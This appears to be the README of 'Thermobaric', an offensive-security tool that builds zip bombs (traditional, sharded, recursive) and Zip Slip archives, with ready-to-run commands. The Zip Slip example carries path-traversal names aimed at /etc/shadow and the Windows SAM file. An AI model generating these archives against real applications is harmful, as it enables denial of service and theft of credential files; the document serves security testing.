# 💥 Thermobaric 💥
Zip Bomb utility for security reaseach purposes ONLY. 

## Usage

### Command line 

```bash 
💥===========================================================💥
   __  __                              __               _
  / /_/ /_  ___  _________ ___  ____  / /_  ____ ______(_)____
 / __/ __ \/ _ \/ ___/ __ `__ \/ __ \/ __ \/ __ `/ ___/ / ___/
/ /_/ / / /  __/ /  / / / / / / /_/ / /_/ / /_/ / /  / / /__
\__/_/ /_/\___/_/  /_/ /_/ /_/\____/_.___/\__,_/_/  /_/\___/
💥===========================================================💥
usage: thermobaric.py [-h] [-r] [-s] [-sf [SLIP_FILE ...]] [-x] [-xn SHARD_NUM] [-t] [-Sb SB] [-Sk SK]
                      [-Sm SM] [-Sg SG] [-c COMPRESSION] -f OUTFILE [-d DEPTH]

options:
  -h, --help            show this help message and exit

Attack Types:
  Various attack types supported by this tool

  -r, --recursive       Generate recursive zip bomb
  -s, --slip            Generate Zip Slip
  -sf [SLIP_FILE ...], --slip-file [SLIP_FILE ...]
                        slip file name to store, can provide multiple names
  -x, --shard           Generate Sharded zip bomb
  -xn SHARD_NUM, --shard-num SHARD_NUM
                        Number of shards to create
  -t                    traditional zip bomb

File Modifiers:
  Arguments to modify file structures

  -c COMPRESSION, --compression COMPRESSION
                        Compression level.
  -f OUTFILE, --outFile OUTFILE
                        Final output filename
  -d DEPTH, --depth DEPTH
                        depth of recursion

Size Modifiers:
  File size of compressed files.

  -Sb SB                file size to compress in bytes
  -Sk SK                file size to compress in kilobytes
  -Sm SM                file size to compress in megabytes
  -Sg SG                file size to compress in gigabytes
```

## Example Attacks

### Traditional Zip Bomb

A traditional zip bomb works by compressing a large file into as small of a package as possible to
bypass file size limitations. When the application attempts to decompress, the large file could rapidly consume memory and lead to DoS. 

```bash
> $ python3 thermobaric.py -t -Sg 30 -c 9 -f traditional_30gc9.zip
```

This example generates a zip file with a single file of 30 Gb worth of data.

### Shard Zip Bomb

A sharded zip bomb achieves the same goal as the traditional zip bomb, but it uses many small files to do this. By generating multiple small files, applications can quickly consume memory decompressing them and lead to DoS senarios.

```bash
> $ python3 thermobaric.py -x -xn 500000 -Sm 16 -c9 -f shard_500000n16m9c.zip
```

This example generates a zip file containing 500,000 files each with 16 Mb worth of data.

### ZipSlip

Zip Slip attacks occur when one creates a zip file containing a file with a name containing a directory traversal attack, such as "../../../../../../../../etc/shadow". Depending on the application, this tool may be able to use this to read or retreive sensitive server-side files. The
slip file (-sf) flag allows one to add multiple files to the same zip.

```bash
> $ python3 thermobaric.py -s -sf "../../../../../etc/shadow" "../../../../../etc/groups" "..\\..\\..\\..\\..\\System32\\config\\SAM" -f slip.zip
```

### Recursive ZipBomb

This works by storing multiple layers of zip files within themselves. 

```bash
$ > python3 thermobaric.py -r -d 500 -sG 15 -f recursive_500d15g.zip
```

This example generates a single 15Gb file nestled into 500 layers of zip files. 